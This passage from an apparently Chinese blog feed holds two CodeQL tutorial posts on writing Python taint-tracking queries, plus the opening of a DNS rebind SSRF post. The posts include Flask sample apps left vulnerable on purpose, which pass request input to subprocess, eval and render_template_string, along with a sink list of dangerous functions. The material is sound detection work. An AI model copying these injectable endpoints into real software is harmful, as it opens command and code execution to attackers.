class="keyword">break</span></span><br></pre></td></tr></table></figure>]]></content>
      <tags>
        <tag>writeup</tag>
      </tags>
  </entry>
  <entry>
    <title>Codeql 踩坑记录 (二)</title>
    <url>/2020/03/31/Codeql-%E8%B8%A9%E5%9D%91%E8%AE%B0%E5%BD%95-%E4%BA%8C/</url>
    <content><![CDATA[<p>首先需要解决的就是上次留下的问题, 添加自定义的 taint track.<br>在自带的 tests 中就有示例, 可以参考 <code>ql/python/ql/test/library-tests/taint/extensions/ExtensionsLib.qll</code>  </p>
<a id="more"></a>

<p>最后大概是这样  </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">class AnyCallFlow extends DataFlowExtension::DataFlowNode &#123;</span><br><span class="line">     AnyCallFlow() &#123;</span><br><span class="line">         exists(CallNode call |</span><br><span class="line">            call.getFunction().(AttrNode).getObject() &#x3D; this</span><br><span class="line">         )</span><br><span class="line">     &#125;</span><br><span class="line"> </span><br><span class="line">     override ControlFlowNode getASuccessorNode() &#123;</span><br><span class="line">         result.(CallNode).getFunction().(AttrNode).getObject() &#x3D; this</span><br><span class="line">     &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>意思就是如果一个 funccall 中是 val.attr 类型的, 且 val 被 taint 了, 那么整个 CallNode 都将被 taint.<br>然后加到 Configuration 里面就可以了  </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">override predicate isExtension(TaintTracking::Extension extension) &#123;</span><br><span class="line">    extension instanceof AnyCallFlow</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>此时就能够识别 split 等方法了, 不过这样的结果肯定是增加误报率了.<br>这里插一句, 最近在看南大开在 B 站上的软件分析课程, 讲的挺好, 这里其实就是 soundness completeness 问题, 在安全这一块还是 soundness 好一点, 所以最好还是牺牲虚警率来提高漏报率吧.  </p>
<p>最后按照官方库的方法, 封装一下, 最后的结果  </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import python</span><br><span class="line">import semmle.python.security.TaintTracking</span><br><span class="line">import semmle.python.web.flask.Request</span><br><span class="line"></span><br><span class="line">class AnyCallFlow extends DataFlowExtension::DataFlowNode &#123;</span><br><span class="line">     AnyCallFlow() &#123;</span><br><span class="line">         exists(CallNode call |</span><br><span class="line">            call.getFunction().(AttrNode).getObject() &#x3D; this</span><br><span class="line">         )</span><br><span class="line">     &#125;</span><br><span class="line"> </span><br><span class="line">     override ControlFlowNode getASuccessorNode() &#123;</span><br><span class="line">         result.(CallNode).getFunction().(AttrNode).getObject() &#x3D; this</span><br><span class="line">     &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class DangerousFunctionArg0 extends Value &#123;</span><br><span class="line">    DangerousFunctionArg0() &#123;</span><br><span class="line">        exists(Value val |</span><br><span class="line">            this &#x3D; val and</span><br><span class="line">            (</span><br><span class="line">                val &#x3D; Value::named(&quot;subprocess.check_output&quot;) or</span><br><span class="line">                val &#x3D; Value::named(&quot;os.system&quot;) or </span><br><span class="line">                val &#x3D; Value::named(&quot;os.popen&quot;) or </span><br><span class="line">                val &#x3D; Value::named(&quot;eval&quot;) or </span><br><span class="line">                val &#x3D; Value::named(&quot;exec&quot;) or</span><br><span class="line">                val &#x3D; Value::named(&quot;flask.render_template_string&quot;)</span><br><span class="line">            )</span><br><span class="line">        )</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class DangerousFunctionArg0Sink extends TaintSink &#123;</span><br><span class="line">    DangerousFunctionArg0Sink() &#123;</span><br><span class="line">        exists(</span><br><span class="line">            CallNode call, DangerousFunctionArg0 dangerous_func |</span><br><span class="line">            call.getFunction().pointsTo(dangerous_func) and</span><br><span class="line">            call.getArg(0) &#x3D; this</span><br><span class="line">        )</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    override predicate sinks(TaintKind taint) &#123;</span><br><span class="line">        any()</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class SystemCommandExecution extends TaintTracking::Configuration &#123;</span><br><span class="line">    SystemCommandExecution() &#123; this &#x3D; &quot;SystemCommandExecution Tracking&quot; &#125;</span><br><span class="line"></span><br><span class="line">    override predicate isSource(DataFlow::Node src, TaintKind kind) &#123;</span><br><span class="line">        src.asCfgNode() instanceof FlaskRequestArgs</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    override predicate isSink(DataFlow::Node sink, TaintKind kind) &#123;</span><br><span class="line">        sink.asCfgNode() instanceof DangerousFunctionArg0Sink</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    override predicate isExtension(TaintTracking::Extension extension) &#123;</span><br><span class="line">         extension instanceof AnyCallFlow</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">from SystemCommandExecution config, DataFlow::Node src, DataFlow::Node sink</span><br><span class="line">where config.hasSimpleFlow(src, sink)</span><br><span class="line">select sink, src</span><br></pre></td></tr></table></figure>

<p>检测以下 sample, 一共 10 个漏洞, 都能找到, 还是不错的  </p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> flask</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">from</span> subprocess <span class="keyword">import</span> check_output</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> request</span><br><span class="line"></span><br><span class="line">app = flask.Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">passby</span><span class="params">(i)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> i.split(<span class="string">'123'</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/index')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> subprocess.check_output(flask.request.args.get(<span class="string">'c'</span>, <span class="string">'ls'</span>))</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/index2')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index2</span><span class="params">()</span>:</span></span><br><span class="line">    tmp = flask.request.args.get(<span class="string">'c'</span>, <span class="string">'ls'</span>)</span><br><span class="line">    tmp = tmp.split(<span class="string">'|'</span>)</span><br><span class="line">    <span class="keyword">return</span> subprocess.check_output(tmp)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/index3')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index3</span><span class="params">()</span>:</span></span><br><span class="line">    tmp = flask.request.args.get(<span class="string">'c'</span>, <span class="string">'ls'</span>)</span><br><span class="line">    tmp = tmp.split(<span class="string">'|'</span>)</span><br><span class="line">    <span class="keyword">return</span> check_output(tmp)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/index4')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index4</span><span class="params">()</span>:</span></span><br><span class="line">    tmp = request.args.get(<span class="string">'c'</span>, <span class="string">'ls'</span>)</span><br><span class="line">    tmp = tmp.split(<span class="string">'|'</span>)</span><br><span class="line">    <span class="keyword">return</span> subprocess.check_output(tmp)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/index5')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index5</span><span class="params">()</span>:</span></span><br><span class="line">    tmp = flask.request.args.get(<span class="string">'c'</span>, <span class="string">'ls'</span>)</span><br><span class="line">    tmp = tmp + <span class="string">"i"</span></span><br><span class="line">    <span class="keyword">return</span> subprocess.check_output(tmp)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/index6')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index6</span><span class="params">()</span>:</span></span><br><span class="line">    tmp = request.args.get(<span class="string">'c'</span>, <span class="string">'ls'</span>)</span><br><span class="line">    tmp = tmp + <span class="string">"i"</span></span><br><span class="line">    <span class="keyword">return</span> subprocess.check_output(tmp)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/index7')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index7</span><span class="params">()</span>:</span></span><br><span class="line">    tmp = request.args.get(<span class="string">'c'</span>, <span class="string">'ls'</span>)</span><br><span class="line">    tmp = tmp + <span class="string">"i"</span></span><br><span class="line">    <span class="keyword">return</span> check_output(tmp)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/index8')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index8</span><span class="params">()</span>:</span></span><br><span class="line">    tmp = request.args.get(<span class="string">'c'</span>, <span class="string">'ls'</span>)</span><br><span class="line">    tmp = tmp + <span class="string">"i"</span></span><br><span class="line">    <span class="keyword">return</span> flask.render_template_string(tmp)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/index9')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index9</span><span class="params">()</span>:</span></span><br><span class="line">    tmp = request.args.get(<span class="string">'c'</span>, <span class="string">'ls'</span>)</span><br><span class="line">    tmp = tmp + <span class="string">"i"</span></span><br><span class="line">    <span class="keyword">return</span> flask.render_template_string(<span class="string">"asd"</span>, t=tmp)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/index10')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index10</span><span class="params">()</span>:</span></span><br><span class="line">    tmp = request.args.get(<span class="string">'c'</span>, <span class="string">'ls'</span>)</span><br><span class="line">    tmp = passby(tmp + <span class="string">"i"</span>)</span><br><span class="line">    <span class="keyword">return</span> flask.render_template_string(<span class="string">"asd"</span>, t=tmp)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/index11')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index11</span><span class="params">()</span>:</span></span><br><span class="line">    tmp = request.args.get(<span class="string">'c'</span>, <span class="string">'ls'</span>)</span><br><span class="line">    tmp = passby(tmp + <span class="string">"i"</span>)</span><br><span class="line">    <span class="keyword">return</span> eval(tmp)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/index12')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index12</span><span class="params">()</span>:</span></span><br><span class="line">    tmp = request.args.get(<span class="string">'c'</span>, <span class="string">'ls'</span>)</span><br><span class="line">    tmp = passby(tmp + <span class="string">"i"</span>)</span><br><span class="line">    <span class="keyword">return</span> flask.render_template_string(tmp)</span><br><span class="line"></span><br><span class="line">app.run()</span><br></pre></td></tr></table></figure>

<p>最后, 其实感觉编写最大的难点还是需要思维的转换, 这种声明式的语言像 SQL 一样, 是告诉程序, 希望在 xx 地方是 xx, 且 xx 里面的 yy 是 zz 这样.<br>需要一点时间来转变思维吧, 之后是这个官方 python 接口库感觉本身写的就有点乱 (逃, 各种类似的对象, 又是 PythonFunctionCall, CallNode 的, 同样的目的可以由一万种不同的方式达成. 感觉对新手确实不太友好. 等后续文档跟上吧.  </p>
]]></content>
      <tags>
        <tag>codeql</tag>
      </tags>
  </entry>
  <entry>
    <title>Codeql 踩坑记录</title>
    <url>/2020/03/30/Codeql-%E8%B8%A9%E5%9D%91%E8%AE%B0%E5%BD%95/</url>
    <content><![CDATA[<h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><p>入口: <a href="https://help.semmle.com/codeql/codeql-cli/procedures/get-started.html" target="_blank" rel="noopener">https://help.semmle.com/codeql/codeql-cli/procedures/get-started.html</a><br>下载地址: <a href="https://github.com/github/codeql-cli-binaries/releases" target="_blank" rel="noopener">https://github.com/github/codeql-cli-binaries/releases</a><br>license: <a href="https://securitylab.github.com/tools/codeql/license" target="_blank" rel="noopener">https://securitylab.github.com/tools/codeql/license</a>  </p>
<a id="more"></a>

<p>license 里面有写:  </p>
<p>Further, except (and only to the extent) permitted by applicable law or applicable third-party license, you will not (and have no right to):</p>
<p>work around any technical limitations in the Software that only allow you to use it in certain ways;<br><strong>reverse engineer</strong>, decompile or disassemble the Software;<br>remove, minimize, block, or modify any notices of GitHub or its suppliers in the Software;<br>use the Software in any way that is against the law; or<br>share, publish, distribute or lend the Software, provide or make available the Software as a hosted solution (whether on a standalone basis or combined, incorporated or integrated with other software or services) for others to use, or transfer the Software or these Terms to any third party.</p>
<p>GitHub CodeQL can only be used on codebases that are released under an OSI-approved open source license, or to perform academic research. It can’t be used to generate CodeQL databases for or during automated analysis, continuous integration or continuous delivery, whether as part of normal software engineering processes or otherwise. For these uses, contact the sales team.</p>
<p>大概意思就是: 主程序是闭源的, 但是检测规则是开源的, 其中一些 <a href="https://github.com/github/codeql-go" target="_blank" rel="noopener">extractor</a> 也开源了, 当然其实 java 写的未混淆, 跟开源差不多.<br>用于学术研究或者检测开源项目都随便使用, 但是拿来商业等操作, 就需要购买商业 license.  </p>
<p>主程序就在 tools/codeql.jar, 也没做混淆啥的. 还是挺良心的.<br>安装包里面自带了运行环境和支持语言的 extractor (甚至自带 java 运行环境), 开箱即用.  </p>
<h2 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h2><p>先写个测试用例看看</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># $ cat flask-example/app.py</span></span><br><span class="line"><span class="keyword">import</span> flask</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"></span><br><span class="line">app = flask.Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> subprocess.check_output(flask.request.args.get(<span class="string">'c'</span>, <span class="string">'ls'</span>))</span><br><span class="line"></span><br><span class="line">app.run()</span><br></pre></td></tr></table></figure>

<p>建立 database  </p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">/home/rmb122/repos/codeql/codeql database create codeql-database --language=python --<span class="built_in">source</span>-root flask-example</span><br></pre></td></tr></table></figure>

<p>然后就喜闻乐见的出错了 233</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[2020-03-30 17:45:00] [build] [INFO] [8] Extracted module _lzma in 22ms</span><br><span class="line">[2020-03-30 17:45:01] [build] [INFO] [3] Extracted file &#x2F;usr&#x2F;lib&#x2F;python3.8&#x2F;site-packages&#x2F;cryptography&#x2F;hazmat&#x2F;backends&#x2F;openssl&#x2F;dsa.py in 765ms</span><br><span class="line">[2020-03-30 17:45:01] [build] [INFO] [5] Extracted file &#x2F;usr&#x2F;lib&#x2F;python3.8&#x2F;site-packages&#x2F;cryptography&#x2F;hazmat&#x2F;primitives&#x2F;serialization&#x2F;ssh.py in 404ms</span><br><span class="line">[2020-03-30 17:45:01] [build] [INFO] [1] Extracted file &#x2F;usr&#x2F;lib&#x2F;python3.8&#x2F;site-packages&#x2F;cryptography&#x2F;hazmat&#x2F;backends&#x2F;openssl&#x2F;encode_asn1.py in 1572ms</span><br><span class="line">[2020-03-30 17:45:01] [build] [ERROR] [1] Failed to extract module _decimal: libmpdec.so.2: cannot open shared object file: No such file or directory</span><br><span class="line">[2020-03-30 17:45:01] [build] [TRACEBACK] [1] &quot;semmle&#x2F;worker.py&quot;, line 220, in _extract_loop</span><br><span class="line">[2020-03-30 17:45:01] [build] [TRACEBACK] [1] &quot;semmle&#x2F;extractors&#x2F;super_extractor.py&quot;, line 47, in process</span><br><span class="line">[2020-03-30 17:45:01] [build] [TRACEBACK] [1] &quot;semmle&#x2F;extractors&#x2F;builtin_extractor.py&quot;, line 14, in process</span><br><span class="line">[2020-03-30 17:45:01] [build] [INFO] [5] Extracted module _io in 50ms</span><br><span class="line">[2020-03-30 17:45:01] [build] [INFO] [8] Extracted file &#x2F;usr&#x2F;lib&#x2F;python3.8&#x2F;site-packages&#x2F;cryptography&#x2F;hazmat&#x2F;primitives&#x2F;asymmetric&#x2F;dh.py in 373ms</span><br><span class="line">[2020-03-30 17:45:01] [build] [INFO] [1] Extracted file &#x2F;usr&#x2F;lib&#x2F;python3.8&#x2F;site-packages&#x2F;werkzeug&#x2F;wrappers&#x2F;cors.py in 85ms</span><br><span class="line">[2020-03-30 17:45:01] [build] [INFO] [7] Extracted file &#x2F;usr&#x2F;lib&#x2F;python3.8&#x2F;argparse.py in 5850ms</span><br><span class="line">[2020-03-30 17:45:01] [build] [INFO] [2] Extracted file &#x2F;usr&#x2F;lib&#x2F;python3.8&#x2F;tarfile.py in 5602ms</span><br><span class="line">[2020-03-30 17:45:01] [build] [INFO] [3] Extracted file &#x2F;usr&#x2F;lib&#x2F;python3.8&#x2F;site-packages&#x2F;werkzeug&#x2F;debug&#x2F;repr.py in 611ms</span><br><span class="line">[2020-03-30 17:45:01] [build] [INFO] [4] Extracted file &#x2F;usr&#x2F;lib&#x2F;python3.8&#x2F;site-packages&#x2F;jinja2&#x2F;parser.py in 2626ms</span><br><span class="line">[2020-03-30 17:45:03] [build] [ERROR] Process 6 timed out</span><br><span class="line">[2020-03-30 17:45:04] [build-err] Traceback (most recent call last):</span><br><span class="line">[2020-03-30 17:45:04] [build-err]   File &quot;&#x2F;home&#x2F;rmb122&#x2F;repos&#x2F;codeql&#x2F;python&#x2F;tools&#x2F;index.py&quot;, line 19, in &lt;module&gt;</span><br><span class="line">[2020-03-30 17:45:04] [build-err]     buildtools.index.main()</span><br><span class="line">[2020-03-30 17:45:04] [build-err]   File &quot;&#x2F;home&#x2F;rmb122&#x2F;repos&#x2F;codeql&#x2F;python&#x2F;tools&#x2F;python3src.zip&#x2F;buildtools&#x2F;index.py&quot;, line 110, in main</span><br><span class="line">[2020-03-30 17:45:04] [build-err]   File &quot;&#x2F;usr&#x2F;lib&#x2F;python3.8&#x2F;subprocess.py&quot;, line 364, in check_call</span><br><span class="line">[2020-03-30 17:45:04] [build-err]     raise CalledProcessError(retcode, cmd)</span><br><span class="line">[2020-03-30 17:45:04] [build-err] subprocess.CalledProcessError: Command &#39;[&#39;python3&#39;, &#39;-S&#39;, &#39;&#x2F;home&#x2F;rmb122&#x2F;repos&#x2F;codeql&#x2F;python&#x2F;tools&#x2F;python_tracer.py&#39;, &#39;-v&#39;, &#39;-z&#39;, &#39;all&#39;, &#39;-c&#39;, &#39;&#x2F;home&#x2F;rmb122&#x2F;temp&#x2F;codeql&#x2F;codeql-database&#x2F;working&#x2F;trap_cache&#39;, &#39;-p&#39;, &#39;&#x2F;usr&#x2F;lib&#x2F;python3.8&#x2F;site-packages&#39;, &#39;-R&#39;, &#39;&#x2F;home&#x2F;rmb122&#x2F;temp&#x2F;codeql&#x2F;flask-example&#39;]&#39; returned non-zero exit status 1.</span><br><span class="line">[2020-03-30 17:45:04] [ERROR] Spawned process exited abnormally (code 1; tried to run: [&#x2F;home&#x2F;rmb122&#x2F;repos&#x2F;codeql&#x2F;python&#x2F;tools&#x2F;autobuild.sh])</span><br><span class="line">A fatal error occurred: Exit status 1 from command: [&#x2F;home&#x2F;rmb122&#x2F;repos&#x2F;codeql&#x2F;python&#x2F;tools&#x2F;autobuild.sh]</span><br></pre></td></tr></table></figure>

<p>问题出在这<br>Failed to extract module _decimal: libmpdec.so.2: cannot open shared object file: No such file or directory  </p>
<p>repl 里面运行一下, 果然也是如此  </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ python</span><br><span class="line">Python 3.8.2 (default, Feb 26 2020, 22:21:03) </span><br><span class="line">[GCC 9.2.1 20200130] on linux</span><br><span class="line">Type &quot;help&quot;, &quot;copyright&quot;, &quot;credits&quot; or &quot;license&quot; for more information.</span><br><span class="line">&gt;&gt;&gt; import _decimal</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File &quot;&lt;stdin&gt;&quot;, line 1, in &lt;module&gt;</span><br><span class="line">ImportError: libmpdec.so.2: cannot open shared object file: No such file or directory</span><br><span class="line">&gt;&gt;&gt;</span><br></pre></td></tr></table></figure>

<p>神奇的居然没有装, pacman -S mpdecimal 装一个就完事了.<br>这应该只扫了用到的库, 没有扫全部的库, 挺快的, 点个赞.  </p>
<p>接下来真正开始写 ql<br>教程在这:<br><a href="https://help.semmle.com/QL/learn-ql/" target="_blank" rel="noopener">https://help.semmle.com/QL/learn-ql/</a><br><a href="https://help.semmle.com/QL/ql-handbook/" target="_blank" rel="noopener">https://help.semmle.com/QL/ql-handbook/</a><br><a href="https://help.semmle.com/qldoc/" target="_blank" rel="noopener">https://help.semmle.com/qldoc/</a>  </p>
<p>官方的规则库:<br><a href="https://github.com/Semmle/ql.git" target="_blank" rel="noopener">https://github.com/Semmle/ql.git</a><br>学习一哈.  </p>
<p>官方自带的 ql 里面有预先定义好一些数据结构, 直接 import python 就能用了, .qll 是 library, .ql 是真正的查询语句.<br>正式运行还需要定义一个 qlpack.yml, 意义跟 pom.xml 差不多吧, 定义包名和依赖<br><a href="https://help.semmle.com/codeql/codeql-cli/reference/qlpack-overview.html" target="_blank" rel="noopener">https://help.semmle.com/codeql/codeql-cli/reference/qlpack-overview.html</a>  </p>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">name:</span> <span class="string">com-rmb122-test</span></span><br><span class="line"><span class="attr">version:</span> <span class="number">0.0</span><span class="number">.1</span></span><br><span class="line"><span class="attr">libraryPathDependencies:</span> <span class="string">codeql-python</span></span><br><span class="line"><span class="attr">extractor:</span> <span class="string">python</span></span><br></pre></td></tr></table></figure>

<p>在 <code>$HOME/.config/codeql/config</code> 里面设置 ql repo 的路径, 这样才能被 import, 感觉现在这种手动配置好蛋痛 =.= 感觉跟自己编译 cpp 一样链接一堆库<br>而且文档 u1s1, 挺乱的, 不过刚被 github 收购, 可以理解, 希望之后能更方便一点.  </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">--search-path &lt;path to ql repo&gt;</span><br></pre></td></tr></table></figure>
<p>注意不要写成 <code>--search-path=&lt;path to ql repo&gt;</code>, 不然识别不了… 坑了我好久.  </p>
<p>然后保存</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import python</span><br><span class="line"></span><br><span class="line">from Function f</span><br><span class="line">where f.getName().matches(&quot;index&quot;)</span><br><span class="line">select f, &quot;This is a function called get...&quot;</span><br></pre></td></tr></table></figure>

<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">/home/rmb122/repos/codeql/codeql query run test.ql -d ../codeql-database/</span><br></pre></td></tr></table></figure>
<p>就能运行了, 或者用 vscode 插件也行, 更方便一点. 可以找到我们写的 index 函数.  </p>
<h2 id="简单的-Taint-demo"><a href="#简单的-Taint-demo" class="headerlink" title="简单的 Taint demo"></a>简单的 Taint demo</h2><p>照着自带的示例, 可以依葫芦画瓢, 写出</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import python</span><br><span class="line">import semmle.python.security.TaintTracking</span><br><span class="line">import semmle.python.web.flask.Request</span><br><span class="line"></span><br><span class="line">class SystemCommandExecution extends TaintTracking::Configuration &#123;</span><br><span class="line">    SystemCommandExecution() &#123; this &#x3D; &quot;SystemCommandExecution Tracking&quot; &#125;</span><br><span class="line"></span><br><span class="line">    override predicate isSource(DataFlow::Node src, TaintKind kind) &#123;</span><br><span class="line">        exists(FlaskRequestArgs taintSrc |</span><br><span class="line">            src.asCfgNode() &#x3D; taintSrc </span><br><span class="line">            &#x2F;&#x2F; and taintSrc.isSourceOf(kind) 这里示例用的 get, 不是 dickstring 这个 kind, 所以需要注释掉</span><br><span class="line">        )</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    override predicate isSink(DataFlow::Node sink, TaintKind kind) &#123;</span><br><span class="line">        exists(</span><br><span class="line">            CallNode call |</span><br><span class="line">            call.getFunction().pointsTo(Value::named(&quot;subprocess.check_output&quot;)) and</span><br><span class="line">            call.getArg(0) &#x3D; sink.asCfgNode()</span><br><span class="line">        )</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">from SystemCommandExecution config, DataFlow::Node src, DataFlow::Node sink</span><br><span class="line">where config.hasSimpleFlow(src, sink)</span><br><span class="line">select sink, src</span><br></pre></td></tr></table></figure>

<p>再检测一下威力加强版示例</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> flask</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">from</span> subprocess <span class="keyword">import</span> check_output</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> request</span><br><span class="line"></span><br><span class="line">app = flask.Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/index')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> subprocess.check_output(flask.request.args.get(<span class="string">'c'</span>, <span class="string">'ls'</span>))</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/index2')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index2</span><span class="params">()</span>:</span></span><br><span class="line">    tmp = flask.request.args.get(<span class="string">'c'</span>, <span class="string">'ls'</span>)</span><br><span class="line">    tmp = tmp.split(<span class="string">'|'</span>)</span><br><span class="line">    <span class="keyword">return</span> subprocess.check_output(tmp)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/index3')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index3</span><span class="params">()</span>:</span></span><br><span class="line">    tmp = flask.request.args.get(<span class="string">'c'</span>, <span class="string">'ls'</span>)</span><br><span class="line">    tmp = tmp.split(<span class="string">'|'</span>)</span><br><span class="line">    <span class="keyword">return</span> check_output(tmp)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/index4')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index4</span><span class="params">()</span>:</span></span><br><span class="line">    tmp = request.args.get(<span class="string">'c'</span>, <span class="string">'ls'</span>)</span><br><span class="line">    tmp = tmp.split(<span class="string">'|'</span>)</span><br><span class="line">    <span class="keyword">return</span> subprocess.check_output(tmp)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/index5')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index5</span><span class="params">()</span>:</span></span><br><span class="line">    tmp = flask.request.args.get(<span class="string">'c'</span>, <span class="string">'ls'</span>)</span><br><span class="line">    tmp = tmp + <span class="string">"i"</span></span><br><span class="line">    <span class="keyword">return</span> subprocess.check_output(tmp)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/index6')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index6</span><span class="params">()</span>:</span></span><br><span class="line">    tmp = request.args.get(<span class="string">'c'</span>, <span class="string">'ls'</span>)</span><br><span class="line">    tmp = tmp + <span class="string">"i"</span></span><br><span class="line">    <span class="keyword">return</span> subprocess.check_output(tmp)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/index7')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index7</span><span class="params">()</span>:</span></span><br><span class="line">    tmp = request.args.get(<span class="string">'c'</span>, <span class="string">'ls'</span>)</span><br><span class="line">    tmp = tmp + <span class="string">"i"</span></span><br><span class="line">    <span class="keyword">return</span> check_output(tmp)</span><br><span class="line"></span><br><span class="line">app.run()</span><br></pre></td></tr></table></figure>

<p>结果是 index, index5-7 都能检测出来, 2-4 没检测出来. 原因应该是 spilt 的结果没被 taint 到.<br>将 isSink 替换成</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">override predicate isSink(DataFlow::Node sink, TaintKind kind) &#123;</span><br><span class="line">        &quot;1&quot; &#x3D; &quot;1&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>也可以观察到 <code>tmp = tmp.split(&#39;|&#39;)</code> 的返回值是没被 select 到的. 也可以验证这一点.  </p>
<p>这样测试下来, 感觉最大的问题还是编写起来测试太费劲了, 就算只更改一点内容, 编译和运行都要 1~2 分钟才能完成. 对 database 也是同理, 只能重新生成, 没有更新的选项, 浪费了大量的时间.<br>剩下的可能是自带的 taint tracking 不够给力, 还好官方给了相关的接口 (DataFlowExtension), 需要自己研究下添加额外 taint 的方法, 至少 split 肯定是得加进去的吧.</p>
]]></content>
      <tags>
        <tag>codeql</tag>
      </tags>
  </entry>
  <entry>
    <title>DNS Rebind 在 SSRF 中的作用</title>
    <url>/2019/02/21/DNS%20Rebind%20%E5%9C%A8%20SSRF%20%E4%B8%AD%E7%9A%84%E4%BD%9C%E7%94%A8/</url>
    <content><![CDATA[<p>这几天沉迷 <a href="https://hgame.vidar.club/" target="_blank" rel="noopener">hgame</a>, 题目质量还是不错的, 其中有一题用到了 DNS rebind, 这里重新记一下笔记. 因为我估计也没多少人看我博客 233, 就直接写了, 不等比赛结束了.</p>
<a id="more"></a>

<p>可以先看看 DNS Rebind 的 <a href="https://en.wikipedia.org/wiki/DNS_rebinding" target="_blank" rel="noopener">wiki</a> 页面, 其实就跟这个名字的意思差不多, 重新绑定, 也就是说第一次请求和第二次请求返回的 IP 地址不同. 我这里直接上题目代码, 看看是如何利用的.</p>
